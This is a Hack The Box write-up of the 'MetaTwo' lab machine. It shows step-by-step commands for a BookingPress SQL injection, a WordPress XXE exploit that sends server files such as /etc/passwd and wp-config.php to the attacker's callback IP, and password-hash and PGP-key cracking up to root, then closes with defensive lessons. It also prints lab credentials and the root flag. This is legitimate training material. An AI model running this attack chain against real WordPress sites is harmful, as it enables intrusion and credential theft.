# HTB Write-Up: MetaTwo

| Field      | Details                                                          |
|------------|------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/MetaTwo)      |
| Difficulty | Easy                                                             |
| OS         | Linux                                                            |
| Author     | Babayev                                                           |
| Date       | June 15, 2026                                                    |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration](#2-enumeration)
3. [Initial Access — BookingPress SQLi (CVE-2022-0739)](#3-initial-access--bookingpress-sqli-cve-2022-0739)
4. [Lateral Movement — WordPress XXE (CVE-2021-29447)](#4-lateral-movement--wordpress-xxe-cve-2021-29447)
5. [Privilege Escalation — Passpie PGP Hash Cracking](#5-privilege-escalation--passpie-pgp-hash-cracking)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

Port scanning was performed with **RustScan** for rapid initial discovery, followed by a detailed **Nmap** service scan:

```bash
rustscan -a 10.129.228.95 --ulimit 5000
```

**Open Ports:**

| Port | Service | Notes                                     |
|------|---------|-------------------------------------------|
| 21   | FTP     | ProFTPD                                   |
| 22   | SSH     | OpenSSH 8.4p1 Debian                      |
| 80   | HTTP    | nginx 1.18.0 — redirects to `metapress.htb` |

Port 80 automatically redirected to `http://metapress.htb/`. The domain was added to `/etc/hosts` before proceeding:

```bash
echo "10.129.228.95 metapress.htb" >> /etc/hosts
```

---

## 2. Enumeration

### 2.1 — WordPress Identification

Browsing to `http://metapress.htb/` revealed a WordPress site. **WPScan** was run to enumerate the version, plugins, and configuration:

```bash
wpscan --url http://metapress.htb/
```

**Key findings:**

| Item                  | Detail                                         |
|-----------------------|------------------------------------------------|
| WordPress Version     | 5.6.2 (Insecure — released 2021-02-22)         |
| XML-RPC               | Enabled at `/xmlrpc.php`                       |
| Plugin                | **BookingPress 1.0.1** — vulnerable to SQLi    |
| PHP Version           | 8.0.24 (via `X-Powered-By` header)             |

The events page at `http://metapress.htb/events/` confirmed the BookingPress plugin was actively in use.

---

## 3. Initial Access — BookingPress SQLi (CVE-2022-0739)

### 3.1 — Vulnerability Overview

BookingPress version 1.0.10 and below is affected by an unauthenticated SQL injection vulnerability (**CVE-2022-0739**). The `total_service` parameter passed to the `bookingpress_front_end_booking_details` AJAX action is not sanitised, allowing arbitrary SQL injection without authentication.

### 3.2 — Exploiting the Vulnerability

A public exploit script was used, targeting the events page where the plugin nonce is embedded:

```bash
python3 booking-sqlinjector.py \
  -u http://metapress.htb \
  -nu http://metapress.htb/events/ \
  -a \
  -o db_dump \
  -p "') UNION SELECT ..."
```

**Result — WordPress user hashes extracted:**

```json
{
  "admin": {
    "email": "admin@metapress.htb",
    "password": "$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV."
  },
  "manager": {
    "email": "manager@metapress.htb",
    "password": "$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70"
  }
}
```

The hashes were saved to a file and cracked with **John the Ripper**:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes
```

**Result:**

| Username | Password          |
|----------|-------------------|
| manager  | `partylikearockstar` |

The `admin` hash did not crack. However, the `manager` credentials were sufficient to authenticate to WordPress.

---

## 4. Lateral Movement — WordPress XXE (CVE-2021-29447)

### 4.1 — Vulnerability Overview

WordPress versions 5.6–5.7 are affected by a server-side XML external entity (XXE) injection vulnerability (**CVE-2021-29447**) in the media upload functionality. A specially crafted WAV file embedding a malicious XML payload causes the server to parse external entities, enabling arbitrary file read from the server's filesystem.

### 4.2 — Exploiting the Vulnerability

A public PoC exploit was used, authenticating as `manager` and directing callbacks to the attacker's machine:

```bash
python3 CVE-2021-29447.py \
  --url http://metapress.htb \
  -u manager \
  -p partylikearockstar \
  --server-ip 10.10.15.24
```

The exploit uploaded a malicious WAV file, triggered the XXE, and served a DTD file back to the target — causing it to exfiltrate local files over HTTP.

### 4.3 — Locating wp-config.php

`/etc/passwd` was read first to confirm the vulnerability and enumerate users. The output revealed the target user `jnelson` with a home directory at `/home/jnelson`.

To find the WordPress root, the nginx vhost configuration was read:

```
File to Exfiltrate: /etc/nginx/sites-enabled/default
```

This revealed the document root as `/var/www/metapress.htb/blog/`. The configuration file was then exfiltrated:

```
File to Exfiltrate: /var/www/metapress.htb/blog/wp-config.php
```

**Credentials recovered from wp-config.php:**

| Parameter | Value              |
|-----------|--------------------|
| DB_NAME   | `blog`             |
| DB_USER   | `blog`             |
| DB_PASS   | `635Aq@TdqrCwXFUZ` |
| FTP user  | `metapress.htb`    |
| FTP pass  | `9NYS_ii@FyL_p5M2NvJ` |

### 4.4 — FTP Access → SSH Key

The FTP credentials were used to log in and retrieve files from the server:

```bash
ftp metapress.htb@metapress.htb
```

Browsing the FTP share revealed a `send_email.php` script containing credentials for the `jnelson` user. SSH access was obtained:

```bash
ssh jnelson@metapress.htb
# Password recovered from FTP files
```

**User flag retrieved from `/home/jnelson/user.txt`.**

---

## 5. Privilege Escalation — Passpie PGP Hash Cracking

### 5.1 — Discovery

Enumerating `jnelson`'s home directory revealed a hidden `.passpie` folder — a [Passpie](https://github.com/marcwebbie/passpie) password manager store:

```bash
ls -la ~/.passpie
# .config  .keys  ssh/
```

The `.keys` file contained both a PGP public key and a PGP **private key** used to encrypt the stored credentials. The `ssh/` subdirectory contained encrypted password entries for `root` and `jnelson`.

### 5.2 — Extracting and Cracking the PGP Key

The private key was saved locally and converted to a crackable hash using **gpg2john**:

```bash
gpg2john passpie.key > passpie.hash
```

The hash was then cracked with John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt passpie.hash
```

**Result:**

```
blink182    (Passpie)
```

Cracked in under one second.

### 5.3 — Exporting Credentials

With the passphrase recovered, the Passpie store was decrypted and exported on the target:

```bash
passpie export /tmp/creds.txt
# Passphrase: blink182
```

**Recovered credentials:**

| Account       | Password           |
|---------------|--------------------|
| `root@ssh`    | `p7qfAZt4_A1xo_0x` |
| `jnelson@ssh` | `Cb4_JmWM8zUZWMu@Ys` |

### 5.4 — Root Access

```bash
su root
# Password: p7qfAZt4_A1xo_0x

whoami
# root
```

**Root flag retrieved from `/root/root.txt`:**

```
2a29537898d79c651cfea43e3cbc13f0
```

---

## 6. Summary

| Phase                  | Technique                                                      | Result                                 |
|------------------------|----------------------------------------------------------------|----------------------------------------|
| Recon                  | RustScan + Nmap                                                | 3 open ports; HTTP on 80               |
| Enumeration            | WPScan                                                         | WordPress 5.6.2, BookingPress 1.0.1    |
| Initial Access         | CVE-2022-0739 — BookingPress unauthenticated SQLi              | WordPress hashes; `manager` cracked    |
| File Read              | CVE-2021-29447 — WordPress XXE via malicious WAV upload        | `wp-config.php` and FTP credentials    |
| Lateral Movement       | FTP access → credential file → SSH as `jnelson`               | User flag                              |
| Privilege Escalation   | Passpie PGP private key → `gpg2john` → John (`blink182`)      | Root SSH password; root shell          |

### Key Takeaways

- **Outdated plugins are as dangerous as outdated core software.** BookingPress 1.0.1 had a publicly weaponised, unauthenticated SQL injection exploit. Keeping all WordPress plugins patched is critical.
- **XXE in media parsers is a high-severity read primitive.** WordPress's failure to disable external entity loading in its media handler allowed full filesystem read as the web server user, leaking configuration files and credentials.
- **Credential files on FTP shares should never exist.** Storing plaintext or recoverable credentials in files accessible over FTP compounds any initial access into a full account takeover.
- **Password manager security depends entirely on the master passphrase.** Passpie's PGP-based encryption is sound, but a weak passphrase (`blink182`) in rockyou.txt renders the entire store trivially crackable. Master passphrases must be long, random, and not dictionary-based.
- **Exposing a PGP private key negates all encryption.** The `.keys` file contained the private key alongside the public key. An attacker only needs offline access to this file plus the passphrase to decrypt every stored credential.
